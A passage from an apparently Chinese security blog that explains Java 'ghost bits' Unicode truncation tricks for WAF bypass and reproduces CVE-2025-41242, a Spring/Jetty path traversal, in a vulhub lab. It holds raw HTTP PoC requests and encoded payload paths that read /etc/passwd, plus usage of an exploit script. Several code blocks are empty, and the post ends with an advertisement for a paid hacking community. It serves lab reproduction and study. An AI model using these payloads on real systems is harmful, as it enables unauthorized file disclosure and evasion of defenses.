0px;min-width: 32px;text-align: left;"><span cid="n284" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 241.65px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">瘊</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n285" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 109.975px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">U+760A</span></span></span></td></tr></tbody></table>## 三、典型攻击场景  
### 3.1 WAF 绕过——最广泛的危害  
  
由于每个危险 ASCII 字符都对应  
**大量**  
可选的 Unicode 字符（高 8 位任意），WAF 几乎不可能通过黑名单穷举防御。统计显示：  
```
```  
### 3.2 文件上传绕过——1.陪sp → 1.jsp  
  
**场景**  
：Tomcat 解析   
filename*  
 时使用   
out.write((byte) c)  
 直接截断  
```
```  
### 3.3 路径穿越——阮严灵丰丰甲来 → .%u002e → ../  
  
**场景**  
：Spring + Jetty 因 URI 解码逻辑不一致导致的漏洞（CVE-2025-41242）  
```
```  
### 3.4 CRLF 注入——瘍瘊 → \r\n  
  
**场景**  
：SMTP 协议写入、HTTP 响应头拼接  
```
```  
### 3.5 JSON 解析绕过——Fastjson / Jackson  
  
**场景**  
：  
Character.digit()  
 接受 Unicode 数字字符，WAF 看到的是非   
@type  
 字符串  
```
```  
  
WAF 看到的是乱码，Fastjson 仍可能解析出   
@type  
 键名。  
  
环境搭建  
```
我这里直接使用centos7+vulhub进行复现的
https://blog.csdn.net/kalilinuxsafe/article/details/145051110
```  
  
相关问题解决  
  
拉取镜像超时  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSPUfeLTWrgW5WGoaDo24YBLA1fWQ6GTuxicmLiaZ4AwKmCYuzetxv9WibxmfCpJiavxKicbTOYx0UOTOOof4rDER6fic8FTlFWQfK94/640?wx_fmt=png&from=appmsg "")  
  
配置镜像加速器解决  
```
在终端执行以下命令：
sudo mkdir -p /etc/docker
sudo tee /etc/docker/daemon.json <<-'EOF'
{
  "registry-mirrors": [
    "https://docker.1ms.run",
    "https://docker.xuanyuan.me", 
    "https://docker.m.daocloud.io",
    "https://hub-mirror.c.163.com",
    "https://mirrors.tuna.tsinghua.edu.cn"
  ]
}
EOF

重启Docker服务
sudo systemctl daemon-reload
sudo systemctl restart docker

验证配置生效
docker info | grep -A 1 "Registry Mirrors"
检查DNS配置（偶发情况）

echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf
重新拉取镜像
docker-compose up -d

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSfv45YV07vJ9bZKZc0odUFMQiaEgql7AEbKuyVMbzRurxHRQiczHLLehWicTDp8rbDRsnTuFwz3jwbdicAyOj1jxwjDZEs7WJykmU/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTBsIIiaYIssXwf6Hh89p7TCC9t9tKUgr8ianSEKBTp6jUtoU1bib9KBJKr9CK5VpQK7Z9yI42RVDhYakbbibwIZtqtuElFMD4B834/640?wx_fmt=png&from=appmsg "")  
  
然后直接查看ip(ifconfig)以及对应的端口进行访问  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboS8LzpJ3kgv9qOONEwjWnl4NXQeWzXVuoic9gFQodtxewIOzFSmzqajF7p7ZjKo1u4ibEw4YFYWvialO8DohVDDC8W9kL8OaOO88Y/640?wx_fmt=png&from=appmsg "")  
  
vi docker-compose.yml  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQSiceOTPmQCicV0sjbiaiaXhjhu5qZhvnNHjib2YOh6Pib0ttCXSZY4548MYIDBKnl5liayWO9wNiaOficgDaqaYaVSpMXH6rYE6UpEqGk/640?wx_fmt=png&from=appmsg "")  
  
直接访问  
```
http://192.168.250.128:8080
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboS6hvoTYJDuPgNMrAicaMFIIq2zjoSRggp81EKolOFx6V9s2rfOkWxECGiaC7EEmS8xcq7MZdp2nAS1QTvVPDUB4a7RATMpwk07Y/640?wx_fmt=png&from=appmsg "")  
  
出现这个说明搭建成功  
## Spring框架因Jetty URI解析不一致导致的路径穿越漏洞（CVE-2025-41242）  
  
Spring框架是Java生态中应用最广泛的应用框架之一，Jetty是Spring Boot应用常用的内嵌HTTP服务器。CVE-2025-41242是一个由Spring框架与Jetty之间URI解码不一致所导致的路径穿越漏洞。  
  
具体原理以及相关利用可以看这个  
  
https://github.com/vulhub/vulhub/blob/master/spring/CVE-2025-41242/README.md  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQdYwdD1LC4Qqkic1gHl3DpndWTgbCVcGa1R6hbWpAINtLmPZaK4YicmBlBNib2nwSSnkERTTiagpTI297Xq13vad9Cm9OaDkLMn9w/640?wx_fmt=png&from=appmsg "")  
## poc  
```
GET /阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passw%64 HTTP/1.1
Host: your-ip:8080
Connection: close
```  
  
这个如果使用burp来复现  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRJtwqhiarfLaSicWGaPOeZD8gA5GjY0mwI1Mu62WiaWMdcQL5KlUBXnBbJq0ev9BLntjjuqeHrmMY0CSKH3FWOapS9oqHsuhjwck/640?wx_fmt=png&from=appmsg "")  
```
会将我们的字符阮严灵丰丰甲来转换成这个.%u002e导致无法复现成功
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQD9W1pwcfUg2TcBcXxMRr01ezHDzic8w6JcwgQOehTaKmzIHlq5l8GwUNT80IduIOXxEpr0bwS7CkttBpcKbgbNvDRibQskHpsM/640?wx_fmt=png&from=appmsg "")  
  
前两天看到了这个插件  
  
工具地址  
  
https://github.com/AugustineFulgur/GhostBitsGenerator  
  
原理  
```
GhostBitsGenerator 利用 Java 在处理数据流时常见的 (byte)char 
强制类型转换缺陷，将攻击载荷（如 SQLi 或 RCE 指令）隐藏在高位 
Unicode 字符中。

该工具的核心价值在于构造“语义视差”：通过生成特定的高位字符，使 
Payload 在流经 WAF 时表现为无害的国际化文本，成功规避特征码匹配；
而一旦载荷进入后端的 Java 业务逻辑，利用其高位截断的特性，Payload
 会在内存中“还原”为原本的攻击指令。说白了就是：绕WAF神器！

使用方式：安装插件后 – 选中需要转换的字节 – 右键 – 插件 – Ghost Bits 
Generator – Generate Ghost Bits，转换后可能显示异常，这是正常现象，
正常发包即可，在这个漏洞下，使用幽灵比特位转化的特殊字符无法正常显示
是正常的。
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQJ6OaqhvMhJSM14cZbSKaX00xU4ERvP79hiaNUgJaAWicJWqzMVzLsrgfpmtyLgeB5IY1eiatbvic3pSFmaibyK5HafH9IsIemSkDo/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSqA8YAuCVN2MzBToEmEdrXJTTria12xzaJVFR9aNYvib8G6O71iaOjrUoPw5bkmfgibZsbSicUQEXYHSyiaghefpKGUQ0B8OFkXlpRk/640?wx_fmt=png&from=appmsg "")  
  
看起来挺好用的，在这里尝试一下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSibSTic5YWDxXYAs2Oqljh8kY2tpbPXP1iaiaCmeSdMus0oqxyba8LsezxV2uWUB22c4nCG1p3E5MVrz2qpcicws4rzYoD0MwrrqpI/640?wx_fmt=png&from=appmsg "")  
  
好像也不太行,可能是打开方式不对，等会在试试  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRBZrAqD8icJuwDh8yibDHFqgibCItN4jVGNeF6903HWCHCiasd6aM43VicquAHYWens9ZBrt8Ribyh8iaaUqMMaI0xaxQI4W3FvCeqfE/640?wx_fmt=png&from=appmsg "")  
  
这里直接使用yakit可以轻松复现  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTK9xmIicceXC7gicE1wHWlIFl528Qcc0UIllZFyDS2PM1yek9Tk5iaYAcwWuP7eJNbq2DfFwKmicdl6DnNGXgCw5diaSMFPP1VnQyg/640?wx_fmt=png&from=appmsg "")  
  
也可以使用yakit的插件，插件仓库里面直接搜索ghost  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRnS9IicNSU8gMIjPRTghjEP7g1n5bYuicy721lgfEWbWBTL8O7nYXZAqiaBQLsX9bFXOT3WjUzn0ucfwticibRbs0ZTHBVibBJCSNv4/640?wx_fmt=png&from=appmsg "")  
  
选择第一个进行下载测试  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRh4eMlGrzZbb6BmIvTMLyIIDlrzt3jsrjrk3d9o58jXVR5pu7E8Z8qF7xe2iaR1iahTPiaNBYXlicESMibw9tyXITOVcKzKbHAXRAY/640?wx_fmt=png&from=appmsg "")  
  
可以看到有多种攻击场景，针对当前，我们直接选择CVE-2025-41242这个  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboT1OSbwZXLzHCz6p3icpSRCcnK4IpPIALztToVgC71P4MQE7BblI34HE6Fsic2dBHc2qLzs6HTy4l2gfsNxzyCeS0vyuKxeR4yHg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQKtMYeAQXXMfS9rYHdwz9UCwr7OFTbLumVzawHnJ91iao8gex3petaVl3d94b4AQwydy2vICVXJ7BWsicDWLMZ2RialD6FMyicobI/640?wx_fmt=png&from=appmsg "")  
  
也可以攻击成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQTtqibyDyW9r4WMkoRxlfAK3foEiaYtlvTEldl6GhcSv7eQGLTLooDDuskkf87UzME91VVcEo1FTG1PUE2S87aOMc1kicC4wqa50/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQmjNvWPIyHicBM7sK7M4Pn6gHnbfwK8lubLgY0SIoUXribPKtl57Tuo3ZD0fsl5D6bDcnuOyHuBjn8rd5D79OMlOCSnv7UmfYx8/640?wx_fmt=png&from=appmsg "")  
  
如果有无影也可以升级到最新版，使用无影生成poc进行测试,攻击场景也有很多我们这里选择，spring目录穿越  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQLLR8N3pXMIYBWJZQo2FCHuhszCHtaVCR2WvLxzGwGKI6kBJlIGRibOzpMCmFk5ibubg5cVHicPjFsiaJuECXqkRwjA6ibR13bqMIA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboT4RkFU1FthuBRNUfRmlAh6xprh13MiasPUpSAKOgicZAD0djYyIph9Dd07b4LUX3o7UC3kukPEwMViblzUeJxw6FFEmHsStJKn98/640?wx_fmt=png&from=appmsg "")  
  
复制poc进行测试  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTMXBdRrcahM3IU7m1wibe1icyT6bkIES5hGxLxEdnVRtngQvpeEJcyrVuAyKXicuHwhHSZ7RZ4picaxyzrzdEdbTTMkoicnriafD8mA/640?wx_fmt=png&from=appmsg "")  
  
直接复制生成的poc进行测试会返回400状态码  
  
我们需要在最前面加一个/  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQp4lV6icXVQ2uB5UgKr4A9GOerP35NgdDXuuM4UyRColKbTgd3JAqAlD5D3n07PibPfR0QCdGTTm623wRp3yyk35iag7ERoz1vnQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQVW1uq3udNdpmu7AtxxNmddCzicGtfCibd08B06UAJk9hHic7B8r1JQvRA4OwmhMcEzk3sbicEDpsfkRn6XFDw6wtGSJjhQNJYDQk/640?wx_fmt=png&from=appmsg "")  
  
poc  
```
/Įĥŵ̰ȰȲͥ/̮̥ŵ̰̰̲ɥ/̮ȥɵȰȰвť/Į̥ɵ̰İĲѥ/ȮХŵḬ̇вɥ/̮Хɵ̰İвť/ȮХѵḬ̇вѥ/Ȯĥѵ̰аȲѥ/ĮХѵİİ̲ɥ/̮ȥ͵аȰȲͥ/Ȯ̥ɵȰа̲ѥ/etc/passw%64
/䘮䰥㩵윰㜰ⴲ/Ｎ阥掠렰쬰帲ﱥ/먮ꠥ䘰㈲ꑥ/ꈮథ瑵䌰켰焲赥/ꨮ欥썵Ḱ⨲ᥥ/꼮逸幵퀰萰쀲꽥/䠮鼥汵錰ⰲ镥/郞㜥ⅵ鄰ꤰ䨲ݥ/弮逸๵舰耰똲来/戮鬥牵༰㔰頲౥/툮숥앵錰㄰贲ꡥ/etc/passw%64
/嬮儥陵愰眰甲湥/攮瀥祵弰尰堲饥/瀮夥乵匰蠰嘲絥/鈮攥瑵瘰怰贲啥/逮锥極蘰唰砲晥/洮营獵估唰耲汥/央挥杵錰爰谲籥/訮圥湵崰攰贲步/舮帥癵嘰昰稲鉥/谮爥蝵琰砰蜲乥/餮礥靵褰瘰謲蕥/etc/passw%64
/騮蠥驵稰地弲瑥/頮舥癵尰鈰怲慥/昮伥啵蜰漰礲陥/堮尥靵尰瀰防慥/贮椥癵栰谰蔲酥/昮夥潵帰搰礲幥/崮鄥腵谰逰锲楥/蜮谥襵鈰笰愲襥/種崥蝵爰嘰堲轥/阮錥聵蜰礰圲履/錮騥兵餰蔰琲煥/etc/passw%64
```  
  
还可以使用这个工具  
```
https://github.com/vulhub/vulhub/blob/master/spring/CVE-2025-41242/poc.py
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQxxVZtLvvYEYbicdD1zL41BBXPNOy64cbse77EKfpqZphHNJzomnDeTMMCYhoDePXRibJia3gGRtBYnhqjc5dZ9ID1xS4HY14ITc/640?wx_fmt=png&from=appmsg "")  
  
简单用法  
```
默认读取/etc/passwd
python3 poc.py http://your-ip:8080
指定一个不同的文件，包含：-f

python3 poc.py http://your-ip:8080 -f /etc/hosts

对于带有自签名证书的HTTPS目标，可以添加跳过TLS验证的步骤：-k
python3 poc.py https://your-ip:8443 -f /etc/passwd -k
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQs7S6NZVZ5ITs7QzjAibXEfibXztpd56SBHKHe2exDU6tGydE2L0bAhJVxHvnrRRw1ictv3TINTsJgS9vDibtDjtxubBcQWxm0lT4/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRDMP1weNsfsRwnAwZxaaqzftrRHjdIS1GBRficARkkKEs3geAeezyKvvnpuvnDhy9r1EVv8OlvC56E0cGTJwDwr480SwUyXWog/640?wx_fmt=png&from=appmsg "")  
  
图形化的可以使用这个，不过这个是生成poc的，目前无影已经集成了。  
  
https://github.com/shiyeshu/GBitsTools  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboT6JGI5BGuECpegz7wOhDLRagWYssicfiaiboUF6FdFwjQ3NVm6iaT5kYsWPp9hH7GUEv07ias7xnosEq2s4zA1hKxvFBKvKKN6uC38/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQ8NUWkFIHSyArnZ928dbibmkmMT6jo1eU4jmLMRmrT5CWYe6oYaW3iaviaquPpPNGkicVhReBg5dCPQc3mrmiafgMaN63sEB8VSjDw/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
**后台回复加群加入交流群**  
  
****  
**广告：********cisp pte/pts &nisp1级2级低价报考**  
  
  
**陌笙安全纷传圈子+陌笙src挖掘知识库+陌笙安全漏洞库+陌笙安全面试题库**  
**简单介绍****（**  
**加入纷传圈子**  
**送****知识库+漏洞库+面试题库****）**  
                          
  
如果觉得合适可以加入,圈子目前价格  
39.9元，价格只会根据圈子内容和圈子人数进行上调，不会下跌。。。    
  
  
**圈子福利**  
   
  
**edu漏洞挖掘1v1指导出洞**  
  
****  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRKQWHxLsRrPqpqdiceX76d7yExQIyOqFmmJAfHQh7qzKvPc2V5z6iaa0RY6Ib8AsGvgS5MKkAk5aaHnJBaSnI10LDKQYMLcQMmg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboR8pnPeapLBK4Jsa4ufCvFoGL66t7PKeZyA3AjNxsObjtnCibN2gzGX7NMS7Wo5sj3YYL2iboeRuQDcWqiapc8xuo5fticoBG4DsyY/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRKIBNIQIVicRWJLbyGRmg92vPzc8375PJpcYVvfywzwqnaeBicZuEbfvuic9KRdjwkahSDic5VqrH2Mb4NkqtkADl5HLIh8gPex60/640?wx_fmt=png&from=appmsg "")  
  
****  
**陌笙src挖掘知识库介绍（内容持续更新中!!!)**  
```
信息收集(主域名信息收集,子域名信息收集等&会永久提供fofa-key助力)
弱口令漏洞&未授权访问漏洞挖掘
任意文件读取&删除&下载&上传漏洞
sql注入漏洞
url重定向漏洞
csrf&ssrf漏洞挖掘
XSS&XXE漏洞挖掘等等常见漏洞
cors&目录遍历&越权漏洞挖掘
EDUSRC(证书站挖掘案例分享&edusrc挖掘技巧分享)
CNVD挖掘技巧分享&实战案例报告编写
公益漏洞挖掘（公益src挖掘漏洞分享&提供补天1权重资产）
SRC挖掘实战(针对各种常见功能总结的常见测试思路等快速提升)
经典常见Nday漏洞(常见中间件&以及各种常见框架)复现
云安全相关漏洞挖掘（云key扫盲&云存储桶&快速识别云环境&云攻防）
AI相关学习（AI基础&AI代码审计实战测试&webLLM攻击等）
APP&小程序漏洞挖掘
等各模块不在一一介绍
```  
  
信息收集  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTu9DGyTubluhYicFynwVBKa4V06sDfEVKOyk5Q4ghZzLMDAuLb1M1oR4RJumGWrADPapFjTrOjpksKQ8q0YYCnl3ZWLof8Knzg/640?wx_fmt=png&from=appmsg "")  
  
src挖掘基础  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboR45bibbJEb28a1gS5yth3r5HyOsgPiaOUHHYriahZyIyrk0LMOsHW4VoDibyBRibTNzptGiaLWX62UwykicwvbxCJPopvklqiaxML8lS8/640?wx_fmt=png&from=appmsg "")  
  
src挖掘实战  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTKWnTsN6CXf3djhXIlMKNRjVmJn3g5b23ur9E6Cx3O68f0hXVjCiaj8J4RYeTGBecqf1k99phG0ice2wtd5lKgR46OeqeLQfMpk/640?wx_fmt=png&from=appmsg "")  
  
  
edusrc  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQVVlTXhibjR8UiakZBQicXRZrQ7hdoOz5G8MQrcuDBGbqJdO0kIz6R9IU4ObAeOiabT8pr6lc7jibdIkKoTjiaXNHPLAwAB3BV2UvLM/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSCrvarBbzP4L9kS6P0LVH9JMdmcbFDKiaicHqMFgTxq3x4iatjDJQicmc7NPC14C9Fk3icFjrouSgNVaN8Byuf0C0Iq9O6D1XPvFvY/640?wx_fmt=png&from=appmsg "")  
  
  
经典nday复现  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRPAemLYYSWRsc2cHYkwwxQicDQNf46MY8wUetFibPmetZdkicr4BNvPF0cBibqyS9emwayFf6njw9kjvBvWLoFDQJY5JQDMSUqh4E/640?wx_fmt=png&from=appmsg "")  
  
  
云安全&AI相关  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRfLMPDcF7l8FiaicK20uQdqQ9jrQnlIHk3J3DPhEpPxLfNia23dOuelLicVlNsvXgvSGa9Y4NfuTqUhxBOfF0nzHngWK01icdQWIDM/640?wx_fmt=png&from=appmsg "")  
  
**陌笙安全漏洞库介绍**  
```
1day&0day分享
EDU学校相关漏洞
Web应用漏洞
CMS漏洞
OA产品漏洞
中间件漏洞
云安全漏洞
人工智能漏洞
其他漏洞
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSajCclDhuRpaLic9Ld915CHU7RqSC1LCrPGfNZiavdPEVeDedDWOPBhtMLCicTp3RNd1lT0Pmfo3mx5B0hUxbQg3ic6Via90NMtZVk/640?wx_fmt=png&from=appmsg "")  
  
****  
**陌笙安全面试库**  
```
渗透测试基本问题一汇总
渗透测试基本问题二汇总
渗透测试基本问题三汇总
微步护网面试题目
长亭科技面试
深信服护网面试
启明星辰渗透测试面试题目
安恒面试题目
360面试
奇安信护网面试
运维面试题目
运维面试题库
网安面试相关文档大全
相关面试文章推荐
等等
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSoLqEzH0a3A4LQrvTIkGx81Sh5pf6fCoEQJhYg715vrJicSkfBuCoAmV2Kp4uOMe5jcUZutPwicibFibtJ1ZmyiaAibCg0XicWnsNcicE/640?wx_fmt=png&from=appmsg "")  
  
  
**陌笙**  
**纷传****圈子介**  
**绍**  
```
1、src挖掘思维导图，信息收集思维导图，edusrc挖掘思维导图，以及后续的红队&面试思维导图&自己网安笔记等持续更新
2、2025-2026的edusrc实战报告包含证书站和非证书站以及2025之前的各种优质报思路分享
3、各种src报告思路分享（内部&外部）
4、分享各种src挖掘&edusrc挖掘培训资料&视频
5、不定期分享通杀、0day
6、有圈子群可以技术交流以及不定期抽取证书&免费rank
7.分享各种护网资料各家安全厂商讲解视频&精选实战面试题目
8、各种框架漏洞技巧分享
9、各种源码分享（泛微、正方系统、用友等）
10、漏洞挖掘工具&信息收集工具&内网渗透免杀等网安工具分享
11、各种ctf资料以及题目分享
12、cnvd挖掘技巧&CNVD资产&src资产分享&补天1权重资产分享&fofakey共用
13、免杀、逆向、红队攻内网防渗透等课程分享
14、漏洞库&字典以各种内容不在一一说明
15、cisp-pte/pts&nisp一级&nisp二级&edusrc证书内部价格
15、如果有漏洞挖掘问题或者工具资料需求可以找群主(尽量满足)
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSY2pbvbP3qGAlW8O43bRvAISCxZm4UDTRsaMVbJKTsjfTMTDlq6qNBcVs4tkl4UzgqGz5ag81baU1rusKE09J9T6cMVliaibibwQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/MSDUaqtwboTrLRQpTicOR7bzyNiajiapVJgyMiaYlEDBVU87YXMnanOFWsCYN3cCVGsKkibzV9dMryvbFXBb4Z3472ib27RJ1Xq1HnKJIp5u49GYQ/640?wx_fmt=jpeg&from=appmsg "")  
  
**目前680多条内容，扫码查看详情，持续更新中。。**  
  
**如果觉得合适可以加入，价格不定期会根据圈子内容和圈子人数进行上调。。**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTAQwq1QiaaJiaFDDVod2HnAzmwIfsd4TjEdX1wXFEwG92VZsKv7QTt6ks60J7rpCzYkiaAsw1DExwrObbss57dAvZcPWjCmfpokw/640?wx_fmt=png&from=appmsg "")  
  
